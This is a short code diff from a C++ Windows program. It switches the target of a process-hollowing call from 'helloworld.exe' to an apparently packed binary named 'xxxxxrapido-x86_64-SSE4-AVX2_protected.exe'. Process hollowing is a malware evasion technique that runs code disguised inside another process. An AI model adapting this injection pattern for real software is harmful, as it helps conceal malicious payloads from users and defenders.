@@ -309,7 +309,7 @@ int _tmain(int argc, _TCHAR* argv[])
 	char* pPath = new char[MAX_PATH];
 	GetModuleFileNameA(0, pPath, MAX_PATH);
 	pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
-	strcat(pPath, "helloworld.exe");
+	strcat(pPath, "xxxxxrapido-x86_64-SSE4-AVX2_protected.exe");
 	
 	CreateHollowedProcess
 	(
